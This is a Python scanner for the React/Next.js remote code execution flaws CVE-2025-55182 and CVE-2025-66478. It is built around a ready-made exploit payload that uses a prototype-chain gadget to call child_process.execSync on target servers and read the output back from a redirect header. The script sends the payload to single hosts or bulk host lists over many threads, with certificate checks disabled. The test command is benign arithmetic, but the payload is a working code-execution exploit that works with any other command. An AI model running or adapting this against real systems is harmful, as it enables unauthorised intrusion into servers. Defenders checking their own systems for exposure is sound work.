#!/usr/bin/env python3
"""
React2Shell Improved Scanner - Auto HTTP/HTTPS fallback
CVE-2025-55182 & CVE-2025-66478

Based on Assetnote scanner with automatic protocol fallback
"""

import argparse
import sys
import json
import re
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from typing import Optional, Tuple

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("Error: 'requests' library required. Install with: pip install requests")
    sys.exit(1)

try:
    from tqdm import tqdm
except ImportError:
    tqdm = None


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"


def build_rce_payload() -> tuple[str, str]:
    """Build the RCE PoC multipart form data payload."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    cmd = 'echo $((41*271))'
    
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def send_payload(target_url: str, headers: dict, body: str, timeout: int) -> Tuple[Optional[requests.Response], Optional[str]]:
    """Send the exploit payload to a URL."""
    try:
        body_bytes = body.encode('utf-8')
        response = requests.post(
            target_url,
            headers=headers,
            data=body_bytes,
            timeout=timeout,
            verify=False,
            allow_redirects=False
        )
        return response, None
    except requests.exceptions.SSLError as e:
        return None, f"SSL_ERROR"
    except requests.exceptions.ConnectionError as e:
        error_str = str(e).lower()
        if "connection refused" in error_str:
            return None, "CONNECTION_REFUSED"
        elif "timeout" in error_str:
            return None, "TIMEOUT"
        return None, f"CONNECTION_ERROR"
    except requests.exceptions.Timeout:
        return None, "TIMEOUT"
    except Exception as e:
        return None, f"ERROR: {str(e)}"


def is_vulnerable(response: requests.Response) -> bool:
    """Check if response indicates RCE vulnerability."""
    redirect_header = response.headers.get("X-Action-Redirect", "")
    return bool(re.search(r'.*/login\?a=11111.*', redirect_header))


def check_host(host: str, timeout: int = 10) -> dict:
    """Check a host for CVE-2025-55182 vulnerability with auto HTTP/HTTPS fallback."""
    
    result = {
        "host": host,
        "vulnerable": None,
        "status_code": None,
        "error": None,
        "protocol_used": None,
        "redirect_header": None,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    
    # Parse the host
    original_host = host.strip()
    if not original_host:
        result["error"] = "Empty host"
        return result
    
    # Determine protocols to try
    if original_host.startswith("http://"):
        protocols = ["http"]
        base_host = original_host[7:].rstrip("/")
    elif original_host.startswith("https://"):
        protocols = ["https", "http"]  # Try HTTPS first, fallback to HTTP
        base_host = original_host[8:].rstrip("/")
    else:
        protocols = ["https", "http"]  # Try both
        base_host = original_host.rstrip("/")
    
    body, content_type = build_rce_payload()
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Content-Type": content_type,
    }
    
    last_error = None
    
    for protocol in protocols:
        target_url = f"{protocol}://{base_host}/"
        
        response, error = send_payload(target_url, headers, body, timeout)
        
        if error:
            last_error = f"{protocol.upper()}: {error}"
            # If SSL error on HTTPS, try HTTP
            if error == "SSL_ERROR" and protocol == "https":
                continue
            # If connection refused, try other protocol
            if error == "CONNECTION_REFUSED":
                continue
            # Timeout - move to next protocol
            if error == "TIMEOUT":
                continue
            continue
        
        # Got a response!
        result["protocol_used"] = protocol
        result["status_code"] = response.status_code
        result["redirect_header"] = response.headers.get("X-Action-Redirect", "")
        
        if is_vulnerable(response):
            result["vulnerable"] = True
            return result
        else:
            result["vulnerable"] = False
            return result
    
    # All protocols failed
    result["error"] = last_error
    return result


def main():
    parser = argparse.ArgumentParser(description="React2Shell Improved Scanner")
    parser.add_argument("-u", "--url", help="Single URL/host to check")
    parser.add_argument("-l", "--list", help="File containing list of hosts")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout in seconds (default: 10)")
    parser.add_argument("-o", "--output", help="Output JSON file")
    parser.add_argument("-q", "--quiet", action="store_true", help="Only show vulnerable hosts")
    
    args = parser.parse_args()
    
    if not args.url and not args.list:
        parser.error("Either -u/--url or -l/--list is required")
    
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    print(f"\n{Colors.CYAN}{Colors.BOLD}React2Shell Improved Scanner - CVE-2025-55182{Colors.RESET}\n")
    
    hosts = []
    if args.url:
        hosts = [args.url]
    elif args.list:
        try:
            with open(args.list) as f:
                hosts = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
            print(colorize(f"[ERROR] File not found: {args.list}", Colors.RED))
            sys.exit(1)
    
    print(f"[*] Loaded {len(hosts)} host(s)")
    print(f"[*] Threads: {args.threads}, Timeout: {args.timeout}s")
    print(f"[*] Auto HTTP/HTTPS fallback enabled\n")
    
    results = []
    vulnerable_count = 0
    not_vulnerable_count = 0
    error_count = 0
    
    iterator = tqdm(total=len(hosts), desc="Scanning") if tqdm else None
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(check_host, host, args.timeout): host for host in hosts}
        
        for future in as_completed(futures):
            result = future.result()
            results.append(result)
            
            if iterator:
                iterator.update(1)
            
            host = result["host"]
            
            if result["vulnerable"] is True:
                vulnerable_count += 1
                status = colorize("[VULNERABLE]", Colors.RED + Colors.BOLD)
                print(f"\n{status} {host} - Status: {result['status_code']} ({result['protocol_used']})")
                print(f"  X-Action-Redirect: {result['redirect_header']}")
            elif result["vulnerable"] is False:
                not_vulnerable_count += 1
                if not args.quiet:
                    status = colorize("[NOT VULN]", Colors.GREEN)
                    print(f"\n{status} {host} - Status: {result['status_code']} ({result['protocol_used']})")
            else:
                error_count += 1
                if not args.quiet:
                    status = colorize("[ERROR]", Colors.YELLOW)
                    print(f"\n{status} {host} - {result['error']}")
    
    if iterator:
        iterator.close()
    
    print(f"\n{'='*60}")
    print(f"SCAN SUMMARY")
    print(f"{'='*60}")
    print(f"  Total scanned: {len(hosts)}")
    print(colorize(f"  Vulnerable: {vulnerable_count}", Colors.RED if vulnerable_count > 0 else Colors.GREEN))
    print(f"  Not vulnerable: {not_vulnerable_count}")
    print(f"  Errors: {error_count}")
    print(f"{'='*60}\n")
    
    if args.output:
        output_data = {
            "scan_time": datetime.now(timezone.utc).isoformat(),
            "total": len(hosts),
            "vulnerable": vulnerable_count,
            "not_vulnerable": not_vulnerable_count,
            "errors": error_count,
            "results": results
        }
        with open(args.output, "w") as f:
            json.dump(output_data, f, indent=2)
        print(colorize(f"[+] Results saved to: {args.output}", Colors.GREEN))


if __name__ == "__main__":
    main()
